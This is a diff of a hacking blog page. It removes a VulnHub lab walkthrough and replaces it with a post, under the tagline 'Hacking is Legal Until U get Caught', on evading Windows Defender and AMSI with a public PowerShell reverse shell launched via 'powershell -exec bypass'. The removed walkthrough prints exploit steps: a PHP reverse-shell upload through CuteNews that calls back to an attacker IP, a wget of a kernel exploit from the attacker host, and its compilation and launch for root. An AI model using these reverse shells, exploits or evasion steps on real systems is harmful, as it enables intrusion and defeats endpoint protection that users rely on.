@@ -873,13 +873,13 @@ margin-left: 32px;
 <div id='header-inner'>
 <div class='titlewrapper'>
 <h1 class='title'>
-<a href='https://blog.geoda-security.com/'>
+<a href='https://machine1337.github.io/pak-hack/'>
 geoda
 </a>
 </h1>
 </div>
 <div class='descriptionwrapper'>
-<p class='description'><span>learning by hacking</span></p>
+<p class='description'><span>Hacking is Legal Until U get Caught</span></p>
 </div>
 </div>
 </div></div>
@@ -1001,268 +1001,36 @@ geoda
 <meta content='6152103887963497837' itemprop='postId'/>
 <a name='6152103887963497837'></a>
 <h3 class='post-title entry-title' itemprop='name'>
-BNE0x03 - Simple Walkthrough
+Bypass Updated Windows Defender Protections
 </h3>
 <div class='post-header'>
 <div class='post-header-line-1'></div>
 </div>
 <div class='post-body entry-content' id='post-body-6152103887963497837' itemprop='articleBody'>
-This is my first VulnHub write-up. I've accrued many folders in my KeepNote and decided it was time to post them in a centralized location to help myself become better at documenting my findings. More than likely the first few posts will be very simple and will not have much narrative. As I become more comfortable, I will start to add my own spin on things. Let's do this.<br />
+Hello Young Fellows, This is my first writeup so please ignore my mistakes as i am not good in making writeups. As u all know that on daily basis Microsoft is working on security to protect windows systems from Malware and other harmful scripts.<br />
 <br />
-This VM is called <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/" target="_blank">SecTalks: BNE0x03</a> - Simple and it was created by <a href="https://www.vulnhub.com/author/robert-winkel,190/" target="_blank">Robert Winkel</a><br />
+When any malware or reverse shell get executed on windows then pop or alert come from Windows Defender Protection and then delete or block that file.</a><br />
 <br />
-I spin up the VM in VirtualBox and kick off an nmap scan on my vboxnet0 interface 192.168.56.0/24:<br />
+In this Writeup, I am going to pick public reverse shell written in powershell which is already detected by windows Defender Protections.<br />
 <br />
-<a name='more'></a><br />
+<br>and we will bypass Windows Defender Protections as well as AMSI.</br>
 <br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><a href="https://www.blogger.com/blogger.g?blogID=3153565643559063342" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"></a><span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span> <span style="color: white;">nmap</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.0</span><span style="color: white;">/24</span>
-
-<span style="color: white;">Starting</span> <span style="color: white;">Nmap</span> <span style="color: #0086f7; font-weight: bold;">7.25</span><span style="color: white;">BETA1</span> <span style="color: white;">(</span> <span style="color: #fb660a; font-weight: bold;">https:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//nmap.org ) at 2016-08-10 20:02 CDT</span>
-<span style="color: white;">Nmap</span> <span style="color: white;">scan</span> <span style="color: white;">report</span> <span style="color: #fb660a; font-weight: bold;">for</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.100</span>
-<span style="color: white;">Host</span> <span style="color: white;">is</span> <span style="color: white;">up</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">0.000055</span><span style="color: white;">s</span> <span style="color: white;">latency).</span>
-<span style="color: white;">All</span> <span style="color: #0086f7; font-weight: bold;">1000</span> <span style="color: white;">scanned</span> <span style="color: white;">ports</span> <span style="color: white;">on</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.100</span> <span style="color: white;">are</span> <span style="color: white;">filtered</span>
-<span style="color: white;">MAC</span> <span style="color: #fb660a; font-weight: bold;">Address:</span> <span style="color: #0086f7; font-weight: bold;">08</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">00</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">27</span><span style="color: white;">:</span><span style="color: #fb660a; font-weight: bold;">E1:F0:</span><span style="color: white;">DE</span> <span style="color: white;">(Oracle</span> <span style="color: white;">VirtualBox</span> <span style="color: white;">virtual</span> <span style="color: white;">NIC)</span>
-
-<span style="color: white;">Nmap</span> <span style="color: white;">scan</span> <span style="color: white;">report</span> <span style="color: #fb660a; font-weight: bold;">for</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.104</span>
-<span style="color: white;">Host</span> <span style="color: white;">is</span> <span style="color: white;">up</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">0.00014</span><span style="color: white;">s</span> <span style="color: white;">latency).</span>
-<span style="color: white;">Not</span> <span style="color: #fb660a; font-weight: bold;">shown:</span> <span style="color: #0086f7; font-weight: bold;">999</span> <span style="color: white;">closed</span> <span style="color: white;">ports</span>
-<span style="color: white;">PORT</span>   <span style="color: white;">STATE</span> <span style="color: white;">SERVICE</span>
-<span style="color: #0086f7; font-weight: bold;">80</span><span style="color: white;">/tcp</span> <span style="color: white;">open</span>  <span style="color: white;">http</span>
-<span style="color: white;">MAC</span> <span style="color: #fb660a; font-weight: bold;">Address:</span> <span style="color: #0086f7; font-weight: bold;">08</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">00</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">27</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">60</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">21</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">5</span><span style="color: white;">C</span> <span style="color: white;">(Oracle</span> <span style="color: white;">VirtualBox</span> <span style="color: white;">virtual</span> <span style="color: white;">NIC)</span>
-
-<span style="color: white;">Nmap</span> <span style="color: white;">scan</span> <span style="color: white;">report</span> <span style="color: #fb660a; font-weight: bold;">for</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.1</span>
-<span style="color: white;">Host</span> <span style="color: white;">is</span> <span style="color: white;">up</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">0.0000020</span><span style="color: white;">s</span> <span style="color: white;">latency).</span>
-<span style="color: white;">Not</span> <span style="color: #fb660a; font-weight: bold;">shown:</span> <span style="color: #0086f7; font-weight: bold;">999</span> <span style="color: white;">closed</span> <span style="color: white;">ports</span>
-<span style="color: white;">PORT</span>    <span style="color: white;">STATE</span> <span style="color: white;">SERVICE</span>
-<span style="color: #0086f7; font-weight: bold;">111</span><span style="color: white;">/tcp</span> <span style="color: white;">open</span>  <span style="color: white;">rpcbind</span>
-
-<span style="color: white;">Nmap</span> <span style="color: #fb660a; font-weight: bold;">done:</span> <span style="color: #0086f7; font-weight: bold;">256</span> <span style="color: white;">IP</span> <span style="color: white;">addresses</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">3</span> <span style="color: white;">hosts</span> <span style="color: white;">up)</span> <span style="color: white;">scanned</span> <span style="color: #fb660a; font-weight: bold;">in</span> <span style="color: #0086f7; font-weight: bold;">7.79</span> <span style="color: white;">seconds</span>
-<span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span>
-</pre>
-</div>
-<br />
-I see that 192.168.56.104 is the box in question. It's time to perform a deeper scan on the host:<br />
-<!-- HTML generated using hilite.me --><a href="https://www.blogger.com/blogger.g?blogID=3153565643559063342" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"></a><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span> <span style="color: white;">nmap</span> <span style="color: white;">-p-</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.104</span>
-
-<span style="color: white;">Starting</span> <span style="color: white;">Nmap</span> <span style="color: #0086f7; font-weight: bold;">7.25</span><span style="color: white;">BETA1</span> <span style="color: white;">(</span> <span style="color: #fb660a; font-weight: bold;">https:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//nmap.org ) at 2016-08-10 20:06 CDT</span>
-<span style="color: white;">Nmap</span> <span style="color: white;">scan</span> <span style="color: white;">report</span> <span style="color: #fb660a; font-weight: bold;">for</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.104</span>
-<span style="color: white;">Host</span> <span style="color: white;">is</span> <span style="color: white;">up</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">0.00011</span><span style="color: white;">s</span> <span style="color: white;">latency).</span>
-<span style="color: white;">Not</span> <span style="color: #fb660a; font-weight: bold;">shown:</span> <span style="color: #0086f7; font-weight: bold;">65534</span> <span style="color: white;">closed</span> <span style="color: white;">ports</span>
-<span style="color: white;">PORT</span>   <span style="color: white;">STATE</span> <span style="color: white;">SERVICE</span>
-<span style="color: #0086f7; font-weight: bold;">80</span><span style="color: white;">/tcp</span> <span style="color: white;">open</span>  <span style="color: white;">http</span>
-<span style="color: white;">MAC</span> <span style="color: #fb660a; font-weight: bold;">Address:</span> <span style="color: #0086f7; font-weight: bold;">08</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">00</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">27</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">60</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">21</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">5</span><span style="color: white;">C</span> <span style="color: white;">(Oracle</span> <span style="color: white;">VirtualBox</span> <span style="color: white;">virtual</span> <span style="color: white;">NIC)</span>
-
-<span style="color: white;">Nmap</span> <span style="color: #fb660a; font-weight: bold;">done:</span> <span style="color: #0086f7; font-weight: bold;">1</span> <span style="color: white;">IP</span> <span style="color: white;">address</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">1</span> <span style="color: white;">host</span> <span style="color: white;">up)</span> <span style="color: white;">scanned</span> <span style="color: #fb660a; font-weight: bold;">in</span> <span style="color: #0086f7; font-weight: bold;">0.77</span> <span style="color: white;">seconds</span>
-<span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span> 
-</pre>
-</div>
-<br />
-<br />
-Looks like this host has only 1 port open, 80. Let's take a look at what's being served on this page. I navigate to the webpage and I'm presented with a CuteNews v.2.0.3 login page:<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://www.blogger.com/blogger.g?blogID=3153565643559063342" imageanchor="1" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"></a><a href="https://4.bp.blogspot.com/-PT2yCVYdMIc/V6vUbgZHrLI/AAAAAAAAARw/Hrzh0EBDPaYjwIsDFnI4H1465uoX-C7JQCLcB/s1600/simple-cutenews.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://4.bp.blogspot.com/-PT2yCVYdMIc/V6vUbgZHrLI/AAAAAAAAARw/Hrzh0EBDPaYjwIsDFnI4H1465uoX-C7JQCLcB/s1600/simple-cutenews.png" /></a></div>
-<br />
-&nbsp;After performing some research, I see that CuteNews v.2.0.3 is vulnerable to an Remote File Upload vulnerability. Looking at the details of the vulnerability, the following steps need to be performed in order to exploit this vulnerability:<br />
+<h2>Step 1: Picking Up Public Reverse Shell</h2>
+As U can see this is a public powershell reverse shell. Just replace Your Ip and Port with sepcified IP and Port No.
+ <img src="https://machine1337.github.io/pak-hack/2.png" alt="shell" style="width:900px;height:300px;"> 
+<br>Now Go To Powershell Console And execute the script By Typing powershell -exec bypass ./reverse-shell.ps1</br>
+You Will See an Alert or Popup From Windows Defender like below:-
+<img src="https://machine1337.github.io/pak-hack/3.png" alt="hi" style="width:900px;height:300px;">
+<h2>Final Step:- Let's Fool The Microsoft Defender Protections</h2>
 <br />
 <!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"> <span style="color: #0086f7; font-weight: bold;">1</span> <span style="color: white;">-</span> <span style="color: white;">Sign</span> <span style="color: white;">up</span> <span style="color: #fb660a; font-weight: bold;">for</span> <span style="color: white;">New</span> <span style="color: white;">User</span>
- <span style="color: #0086f7; font-weight: bold;">2</span> <span style="color: white;">-</span> <span style="color: white;">Log</span> <span style="color: #fb660a; font-weight: bold;">In</span> 
- <span style="color: #0086f7; font-weight: bold;">3</span> <span style="color: white;">-</span> <span style="color: white;">Go</span> <span style="color: #fb660a; font-weight: bold;">to</span> <span style="color: white;">Personal</span> <span style="color: white;">options</span> <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//www.target.com/cutenews/index.php?mod=main&amp;opt=personal</span>
- <span style="color: #0086f7; font-weight: bold;">4</span> <span style="color: white;">-</span> <span style="color: #fb660a; font-weight: bold;">Select</span> <span style="color: white;">Upload</span> <span style="color: white;">Avatar</span> <span style="color: #fb660a; font-weight: bold;">Example:</span> <span style="color: white;">Evil.jpg</span>
- <span style="color: #0086f7; font-weight: bold;">5</span> <span style="color: white;">-</span> <span style="color: #fb660a; font-weight: bold;">use</span> <span style="color: white;">tamper</span> <span style="color: white;">data</span>  <span style="color: white;">&amp;</span> <span style="color: #fb660a; font-weight: bold;">Rename</span> <span style="color: white;">File</span> <span style="color: white;">Evil.jpg</span> <span style="color: #fb660a; font-weight: bold;">to</span> <span style="color: white;">Evil.php</span>
-   
-<span style="color: white;">-----------------------------2847913122899\r</span><span style="color: #fb660a; font-weight: bold;">\nContent-Disposition:</span> <span style="color: white;">form-data;</span> <span style="color: white;">name=</span><span style="color: #0086d2;">"avatar_file"</span><span style="color: white;">;</span> <span style="color: white;">filename=</span><span style="color: #0086d2;">"Evil.php"</span><span style="color: white;">\r\</span>
- 
-<span style="color: #0086f7; font-weight: bold;">6</span> <span style="color: white;">-</span> <span style="color: white;">Your</span> <span style="color: white;">Shell</span> <span style="color: white;">:</span> <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//127.0.0.1/cutenews/uploads/avatar_Username_FileName.php</span>
- 
- <span style="color: #fb660a; font-weight: bold;">Example:</span> <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php</span>
-</pre>
-</div>
-<br />
-Time to get to work. I create a new user by clicking <i>(register)</i> and entering the following:<br />
-<br />
-Username: geoda<br />
-Nickname: geoda<br />
-Password: geodageoda<br />
-Confirm: geodageoda<br />
-Email: geoda@geoda.com<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://2.bp.blogspot.com/-MbY9O7xZx2M/V6vVLEY9tBI/AAAAAAAAAR0/2-6svYUwPXkwPLVt5O59uTf3LJ_hz4XGgCLcB/s1600/CuteNews-register.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://2.bp.blogspot.com/-MbY9O7xZx2M/V6vVLEY9tBI/AAAAAAAAAR0/2-6svYUwPXkwPLVt5O59uTf3LJ_hz4XGgCLcB/s1600/CuteNews-register.png" /></a></div>
-<br />
-I login and click on <i>Personal options</i>.<br />
-<br />
-At this point, I need to upload an avatar which will be my reverse shell utilizing php. Lucky for me, and thanks to pentester monkey, there's a reverse shell already created for us in Kali!<br />
-<br />
-This reverse shell is located in <i>/usr/share/webshells/php/php-reverse-shells.php</i><br />
-<br />
-I copy this file down and save it as Evil.jpg:<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span> <span style="color: white;">cat</span> <span style="color: white;">Evil.jpg</span> 
-<span style="color: white;">&lt;?php</span>
-<span style="background-color: #0f140f; color: #008800; font-style: italic;">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
-<span style="background-color: #0f140f; color: #008800; font-style: italic;">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
 
-<span style="color: white;">[...snippet...]</span>
+<br />
+<img src="https://machine1337.github.io/pak-hack/new-ad.gif" alt="sh" style="width:900px;height:300px;">
+<br />
 
-<span style="color: white;">set_time_limit</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">0</span><span style="color: white;">);</span>
-<span style="color: #0086d2;">$VERSION</span> <span style="color: white;">=</span> <span style="color: #0086d2;">"1.0"</span><span style="color: white;">;</span>
-<span style="color: #0086d2;">$ip</span> <span style="color: white;">=</span> <span style="color: white;">'</span><span style="color: #0086f7; font-weight: bold;">192.168.56.1</span><span style="color: white;">';</span>  <span style="background-color: #0f140f; color: #008800; font-style: italic;">// CHANGE THIS</span>
-<span style="color: #0086d2;">$port</span> <span style="color: white;">=</span> <span style="color: #0086f7; font-weight: bold;">443</span><span style="color: white;">;</span>       <span style="background-color: #0f140f; color: #008800; font-style: italic;">// CHANGE THIS</span>
-<span style="color: #0086d2;">$chunk_size</span> <span style="color: white;">=</span> <span style="color: #0086f7; font-weight: bold;">1400</span><span style="color: white;">;</span>
-<span style="color: #0086d2;">$write_a</span> <span style="color: white;">=</span> <span style="color: white;">null;</span>
-<span style="color: #0086d2;">$error_a</span> <span style="color: white;">=</span> <span style="color: white;">null;</span>
-<span style="color: #0086d2;">$shell</span> <span style="color: white;">=</span> <span style="color: white;">'uname</span> <span style="color: white;">-a;</span> <span style="color: white;">w;</span> <span style="color: white;">id;</span> <span style="color: white;">/bin/sh</span> <span style="color: white;">-i';</span>
-<span style="color: #0086d2;">$daemon</span> <span style="color: white;">=</span> <span style="color: #0086f7; font-weight: bold;">0</span><span style="color: white;">;</span>
-<span style="color: #0086d2;">$debug</span> <span style="color: white;">=</span> <span style="color: #0086f7; font-weight: bold;">0</span><span style="color: white;">;</span>
 
-<span style="background-color: #0f140f; color: #008800; font-style: italic;">//</span>
-<span style="background-color: #0f140f; color: #008800; font-style: italic;">// Daemonise ourself if possible to avoid zombies later</span>
-<span style="background-color: #0f140f; color: #008800; font-style: italic;">//</span>
-
-<span style="color: white;">[...snippet...]</span>
-
-<span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">~/VM/simple-vm#</span> 
-</pre>
-</div>
-<br />
-As shown above, I updated the IP and Port to <i>192.168.56.1 </i>and <i>443</i> respectively.<br />
-<br />
-Now that I have my reverse shell in order, it's time to upload it CuteNews, intercept the image utilizing tamper data and rename the file to the proper .php extension.<br />
-<br />
-I click <i>Browse...</i> and locate my <i>Evil.jpg</i> reverse shell and press Okay. I then fire up tamper data and press <i>Save Changes</i>.<br />
-<br />
-Tamper data immediately captures my request and asked if I'd like to tamper the data. I say yes:<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://1.bp.blogspot.com/--PhX_CMxGGo/V6vbL9-SHRI/AAAAAAAAASE/JiLkDDznj64vb5IYNq6O-AH3E87H1RR2gCLcB/s1600/TamperData-popup.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://1.bp.blogspot.com/--PhX_CMxGGo/V6vbL9-SHRI/AAAAAAAAASE/JiLkDDznj64vb5IYNq6O-AH3E87H1RR2gCLcB/s1600/TamperData-popup.png" /></a></div>
-<br />
-<br />
-Per the exploit, I need to change the Evil.jpg to Evil.php within the POST_DATA parameter as shown below:<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://2.bp.blogspot.com/-VIFa2kTk1jc/V6vbehRSLEI/AAAAAAAAASI/W45AyfdPlaMbgQEEcbpTcj__fCyZG-I7ACLcB/s1600/Tamper-Eviljpg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="https://2.bp.blogspot.com/-VIFa2kTk1jc/V6vbehRSLEI/AAAAAAAAASI/W45AyfdPlaMbgQEEcbpTcj__fCyZG-I7ACLcB/s320/Tamper-Eviljpg.png" width="303" /></a></div>
-<br />
-Is changed to:<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://3.bp.blogspot.com/-JhFAqnEU604/V6vbxp-97WI/AAAAAAAAASM/nNBxDsxn6gM-ca75IYVlsnJURH4299f_wCLcB/s1600/Tamper_Evilphp.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="https://3.bp.blogspot.com/-JhFAqnEU604/V6vbxp-97WI/AAAAAAAAASM/nNBxDsxn6gM-ca75IYVlsnJURH4299f_wCLcB/s320/Tamper_Evilphp.png" width="303" /></a></div>
-<br />
-I press okay and submit the updated payload. If all is successful, I should run netcat on port 443 and navigate to my reverse shell file and a reverse shell should pop.<br />
-<br />
-<div class="separator" style="clear: both; text-align: center;">
-<a href="https://4.bp.blogspot.com/-uzjrSHMkKrE/V6vcuCUW19I/AAAAAAAAASY/2Mo5ZyT0JM8BEdy_GTua2opN41tPHHzyQCLcB/s1600/ReverseShellPop.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="622" src="https://4.bp.blogspot.com/-uzjrSHMkKrE/V6vcuCUW19I/AAAAAAAAASY/2Mo5ZyT0JM8BEdy_GTua2opN41tPHHzyQCLcB/s640/ReverseShellPop.png" width="640" /></a></div>
-<br />
-Success!! I am on the box as a <i>www-data</i> user<br />
-<br />
-First things first, I break out of my "jail" with python:<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: white;">$</span> <span style="color: white;">id</span>
-<span style="color: white;">uid=33(www-data)</span> <span style="color: white;">gid=33(www-data)</span> <span style="color: white;">groups=33(www-data)</span>
-<span style="color: white;">$</span> <span style="color: white;">python</span> <span style="color: white;">-c</span> <span style="color: white;">'import</span> <span style="color: white;">pty;pty.spawn(</span><span style="color: #0086d2;">"/bin/bash"</span><span style="color: white;">)'</span>
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/$</span> <span style="color: white;">id</span>
-<span style="color: white;">id</span>
-<span style="color: white;">uid=33(www-data)</span> <span style="color: white;">gid=33(www-data)</span> <span style="color: white;">groups=33(www-data)</span>
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/$</span> 
-</pre>
-</div>
-<br />
-I then navigate around the box and recognize that it is running Ubuntu 14.04 and kernel 3.16.<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/$</span> <span style="color: white;">cat</span> <span style="color: white;">/proc/version</span>
-<span style="color: white;">cat</span> <span style="color: white;">/proc/version</span>
-<span style="color: white;">Linux</span> <span style="color: white;">version</span> <span style="color: #0086f7; font-weight: bold;">3.16.0-30</span><span style="color: white;">-generic</span> <span style="color: white;">(buildd@phianna)</span> <span style="color: white;">(gcc</span> <span style="color: white;">version</span> <span style="color: #0086f7; font-weight: bold;">4.8.2</span> <span style="color: white;">(Ubuntu</span> <span style="color: #0086f7; font-weight: bold;">4.8.2-19</span><span style="color: white;">ubuntu1)</span> <span style="color: white;">)</span> <span style="color: #fb660a; font-weight: bold;">#40</span><span style="color: white;">~14</span><span style="color: #0086f7; font-weight: bold;">.04.1</span><span style="color: white;">-Ubuntu</span> <span style="color: white;">SMP</span> <span style="color: white;">Thu</span> <span style="color: white;">Jan</span> <span style="color: #0086f7; font-weight: bold;">15</span> <span style="color: #0086f7; font-weight: bold;">17</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">45</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">15</span> <span style="color: white;">UTC</span> <span style="color: #0086f7; font-weight: bold;">2015</span>
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/$</span> 
-</pre>
-</div>
-<br />
-This is vulnerable to a <a href="https://www.exploit-db.com/exploits/37292/" target="_blank"><i>'overlayfs'</i> Local Root Shell exploit</a>.<br />
-<br />
-I download the exploit to my local host and then add it to my <i>/var/www/</i> directory and start apache.<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">/var/www/html#</span> <span style="color: white;">ls</span> <span style="color: #0086f7; font-weight: bold;">37292</span><span style="color: white;">.c</span> 
-<span style="color: #0086f7; font-weight: bold;">37292</span><span style="color: white;">.c</span>
-<span style="color: #fb660a; font-weight: bold;">root@localhost:</span><span style="color: white;">/var/www/html#</span> 
-</pre>
-</div>
-<br />
-While on the remote host, I upload my exploit to the <i>/tmp </i>directory and compile:<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/tmp$</span> <span style="color: white;">wget</span> <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//192.168.56.1/37292.c -O exploit.c</span>
-<span style="color: white;">wget</span> <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//192.168.56.1/37292.c -O exploit.c</span>
-<span style="color: white;">--2016-08-10</span> <span style="color: #0086f7; font-weight: bold;">23</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">27</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">05</span><span style="color: white;">--</span>  <span style="color: #fb660a; font-weight: bold;">http:</span><span style="background-color: #0f140f; color: #008800; font-style: italic;">//192.168.56.1/37292.c</span>
-<span style="color: white;">Connecting</span> <span style="color: #fb660a; font-weight: bold;">to</span> <span style="color: #0086f7; font-weight: bold;">192.168.56.1</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">80</span><span style="color: white;">...</span> <span style="color: white;">connected.</span>
-<span style="color: white;">HTTP</span> <span style="color: white;">request</span> <span style="color: white;">sent,</span> <span style="color: white;">awaiting</span> <span style="color: white;">response...</span> <span style="color: #0086f7; font-weight: bold;">200</span> <span style="color: white;">OK</span>
-<span style="color: #fb660a; font-weight: bold;">Length:</span> <span style="color: #0086f7; font-weight: bold;">4969</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">4.9</span><span style="color: white;">K)</span> <span style="color: white;">[text/x-csrc]</span>
-<span style="color: white;">Saving</span> <span style="color: #fb660a; font-weight: bold;">to:</span> <span style="color: white;">'exploit.c'</span>
-
-<span style="color: #0086f7; font-weight: bold;">100</span><span style="color: white;">%[======================================&gt;]</span> <span style="color: #0086f7; font-weight: bold;">4</span><span style="color: white;">,</span><span style="color: #0086f7; font-weight: bold;">969</span>       <span style="color: white;">--.-K/s</span>   <span style="color: #fb660a; font-weight: bold;">in</span> <span style="color: #0086f7; font-weight: bold;">0</span><span style="color: white;">s</span>      
-
-<span style="color: #0086f7; font-weight: bold;">2016-08-10</span> <span style="color: #0086f7; font-weight: bold;">23</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">27</span><span style="color: white;">:</span><span style="color: #0086f7; font-weight: bold;">05</span> <span style="color: white;">(</span><span style="color: #0086f7; font-weight: bold;">1.27</span> <span style="color: white;">GB/s)</span> <span style="color: white;">-</span> <span style="color: white;">'exploit.c'</span> <span style="color: white;">saved</span> <span style="color: white;">[</span><span style="color: #0086f7; font-weight: bold;">4969</span><span style="color: white;">/4969]</span>
-
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/tmp$</span> <span style="color: white;">gcc</span> <span style="color: white;">exploit.c</span> <span style="color: white;">-o</span> <span style="color: white;">exploit</span>
-<span style="color: white;">gcc</span> <span style="color: white;">exploit.c</span> <span style="color: white;">-o</span> <span style="color: white;">exploit</span>
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/tmp$</span> 
-</pre>
-</div>
-<br />
-Now that my exploit is loaded, I verify my current user and then launch the exploit:<br />
-<br />
-<!-- HTML generated using hilite.me --><br />
-<div style="background: #111111; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;">
-<pre style="line-height: 125%; margin: 0;"><span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/tmp$</span> <span style="color: white;">id</span>
-<span style="color: white;">id</span>
-<span style="color: white;">uid=33(www-data)</span> <span style="color: white;">gid=33(www-data)</span> <span style="color: white;">groups=33(www-data)</span>
-<span style="color: #fb660a; font-weight: bold;">www-data@simple:</span><span style="color: white;">/tmp$</span> <span style="color: white;">./exploit</span>
-<span style="color: white;">./exploit</span>
-<span style="color: white;">spawning</span> <span style="color: white;">threads</span>
-<span style="color: white;">mount</span> <span style="color: #fb660a; font-weight: bold;">#1</span>
-<span style="color: white;">mount</span> <span style="color: #fb660a; font-weight: bold;">#2</span>
-<span style="color: white;">child</span> <span style="color: white;">threads</span> <span style="color: white;">done</span>
-<span style="color: white;">/etc/ld.so.preload</span> <span style="color: white;">created</span>
